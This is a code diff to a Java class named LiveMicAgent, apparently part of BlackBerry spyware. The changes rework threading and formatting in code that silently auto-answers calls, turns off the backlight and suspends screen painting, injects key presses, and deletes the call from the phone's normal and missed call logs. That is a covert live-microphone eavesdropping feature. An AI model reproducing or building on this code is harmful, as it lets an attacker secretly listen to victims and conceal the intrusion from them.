@@ -209,7 +209,6 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             return;
         }
 
-        
         //MenuWalker.walk(new String[] { "Activate Speakerphone" });
         MenuWalker.walk(new String[] { "Home Screen", "Return to Phone" });
 
@@ -243,11 +242,11 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             return;
         }
 
+        suspendPainting(false);
         Backlight.enable(false);
+        suspendPainting(true);
 
-        //suspendPainting(false);
-
-        Utils.sleep(2000);
+        //Utils.sleep(2000);
         autoanswer = true;
     }
 
@@ -277,13 +276,16 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             //#endif
 
             removePhoneCall();
-
-            suspendPainting(false);
+            Application.getApplication().invokeLater(new Runnable() {
+                public void run() {
+                    suspendPainting(false);
+                }
+            });
         }
     }
 
     private void removePhoneCall() {
-        Thread t = new Thread() {
+        Application.getApplication().invokeLater(new Runnable() {
             public void run() {
                 init();
                 //#ifdef DEBUG
@@ -295,8 +297,8 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
                 removePhoneCallFromFolder(PhoneLogs.FOLDER_NORMAL_CALLS);
                 removePhoneCallFromFolder(PhoneLogs.FOLDER_MISSED_CALLS);
             }
-        };
-        t.start();
+        });
+        
     }
 
     protected void removePhoneCallFromFolder(long folderID) {
@@ -370,12 +372,12 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
 
         stopAudio();
 
-        if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {            
+        if (DeviceInfo.getIdleTime() > MINIMUM_IDLE_TIME) {
             KeyInjector.pressKey(Keypad.KEY_SEND);
         } else {
             KeyInjector.pressKey(Keypad.KEY_END);
         }
-        
+
         Backlight.enable(false);
         suspendPainting(true);
     }
@@ -423,11 +425,12 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
         }
 
         //#ifdef DEBUG
-        debug.trace("suspendPainting: " + suspend );
+        debug.trace("suspendPainting: " + suspend);
         //#endif              
 
         synchronized (Application.getEventLock()) {
-            boolean suspended =  UiApplication.getUiApplication().isPaintingSuspended();
+            boolean suspended = UiApplication.getUiApplication()
+                    .isPaintingSuspended();
             if (suspended != suspend) {
                 try {
                     //#ifdef LIVE_MIC_ENABLED
@@ -577,7 +580,6 @@ public class LiveMicAgent extends Agent implements BacklightObserver,
             callingHistory.put(new Integer(callId), phoneNumber);
         }
 
-        
     }
 
     public void callRemoved(int arg0) {
